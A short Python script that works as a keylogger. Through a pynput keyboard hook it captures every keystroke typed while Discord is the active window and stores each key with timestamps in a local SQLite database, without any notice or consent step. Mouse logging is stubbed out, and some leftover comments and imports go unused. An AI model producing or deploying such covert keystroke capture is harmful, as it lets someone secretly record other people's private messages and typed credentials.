from pynput import keyboard, mouse
import pandas as pd
from datetime import datetime
import psutil
import win32gui
import win32process
import time
import threading
import sqlite3
# Create an empty DataFrame with columns "Time" and "Button"
timeout = 3  # Seconds before inserting "/"
stop_event = threading.Event()
DB_PATH = "Database.db"
last_backspace_time = None
count = 0
# Function to log key presses with the time and key/button name
def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()  # Get active window handle
        _, pid = win32process.GetWindowThreadProcessId(hwnd)  # Get process ID
        process = psutil.Process(pid)  # Get process details
        return process.name()  # Return the executable name
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return "Unknown"

def on_key_press(key):
    if get_active_window() == "Discord.exe":
        try:
            button = key.char
        except AttributeError:
            button = str(key)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        timestampMS = time.time()
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute('''
                        CREATE TABLE IF NOT EXISTS messages (
                            timestamp TEXT,
                            timestampMS Int,
                            message TEXT
                        )
                    ''')
            conn.execute('INSERT INTO messages (timestamp, timestampMS, message) VALUES (?, ?, ?)', (timestamp, timestampMS, button))
            conn.commit()

# Function to log mouse clicks with the time and button
# def on_click(x, y, button, pressed):
#     if pressed:
#         program = get_active_window()
#         button_name = str(button)  # Get the button name
#         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current time
#         global df
#         # Append new entry to the dataframe
#         # Append the new entry to the CSV without header


# Start keyboard and mouse listeners
keyboard_listener = keyboard.Listener(on_press=on_key_press)
#mouse_listener = mouse.Listener(on_click=on_click, on_release=on_key_release)

keyboard_listener.start()
#mouse_listener.start()

keyboard_listener.join()
#mouse_listener.join()

conn = sqlite3.connect('Database.db')
cursor = conn.cursor()
